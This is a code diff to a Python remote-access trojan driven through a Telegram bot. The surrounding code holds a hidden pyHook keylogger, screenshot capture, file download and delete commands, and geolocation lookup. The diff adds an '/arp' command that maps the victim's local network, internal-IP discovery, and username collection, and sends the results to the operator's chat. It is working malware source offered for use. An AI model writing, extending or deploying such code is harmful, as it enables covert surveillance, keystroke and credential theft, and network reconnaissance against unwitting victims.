@@ -12,8 +12,12 @@ import threading 									#used for proxy
 import proxy
 import pyaudio, wave 								# /hear
 import telepot, requests 							# telepot => telegram, requests => file download
+from telepot.namedtuple import InlineKeyboardMarkup, InlineKeyboardButton
 import os, os.path, platform, ctypes
 import pyHook, pythoncom 							# keylogger
+import socket										# internal IP
+import getpass										# get username
+import collections
 
 me = singleton.SingleInstance() 
 
@@ -46,7 +50,8 @@ user = os.environ.get("USERNAME")	# Windows username to append keylogs.txt
 log_file = hide_folder + '\\keylogs.txt'
 hookManager = pyHook.HookManager()
 # functionalities dictionary: command:arguments
-functionalities = { '/capture_pc' : '', \
+functionalities = { '/arp' : '', \
+					'/capture_pc' : '', \
 					'/cd':'<target_dir>', \
 					'/delete':'<target_file>', \
 					'/download':'<target_file>', \
@@ -67,6 +72,11 @@ functionalities = { '/capture_pc' : '', \
 with open(log_file, "a") as writing:
 	writing.write("-------------------------------------------------\n")
 	writing.write(user + " Log: " + strftime("%b %d@%H:%M") + "\n\n")
+	
+def internalIP():
+    internal_ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    internal_ip.connect(('google.com', 0))
+    return internal_ip.getsockname()[0]
 	
 def checkchat_id(chat_id):
 	return len(known_ids) == 0 or str(chat_id) in known_ids
@@ -91,7 +101,14 @@ def handle(msg):
 			print 'Got message from ' + str(chat_id) + ': ' + msg['text']
 			command = msg['text']
 			response = ''
-			if command == '/capture_pc':
+			if command == '/arp':
+				response = ''
+				bot.sendChatAction(chat_id, 'typing')
+				lines = os.popen('arp -a -N ' + internalIP())
+				for line in lines:
+					line.replace('\n\n', '\n')
+					response += line
+			elif command == '/capture_pc':
 				bot.sendChatAction(chat_id, 'typing')
 				screenshot = ImageGrab.grab()
 				screenshot.save('screenshot.jpg')
@@ -193,7 +210,7 @@ def handle(msg):
 			elif command == '/ip_info':
 				bot.sendChatAction(chat_id, 'find_location')
 				info = requests.get('http://ipinfo.io').text #json format
-				response = info
+				response = 'External IP: ' + info.replace('{', '').replace('}', '').replace(' "', '').replace('"','') + '\n' + 'Internal IP: ' + '\n' + internalIP()
 				location = (loads(info)['loc']).split(',')
 				bot.sendLocation(chat_id, location[0], location[1])
 			elif command == '/keylogs':
@@ -224,6 +241,7 @@ def handle(msg):
 				info = ''
 				for pc_info in platform.uname():
 					info += '\n' + pc_info
+				info += '\n' + 'Username: ' + getpass.getuser()
 				response = info
 			elif command.startswith('/play'):
 				command = command.replace('/play ', '')
@@ -291,7 +309,7 @@ def handle(msg):
 						msg = {'text' : command, 'chat' : { 'id' : chat_id }}
 						handle(msg)
 			elif command == '/help':
-				response = "\n".join(command+': '+description for command,description in functionalities.items())
+				response = "\n".join(command + ' ' + description for command,description in sorted(functionalities.items()))
 			else: # redirect to /help
 				msg = {'text' : '/help', 'chat' : { 'id' : chat_id }}
 				handle(msg)
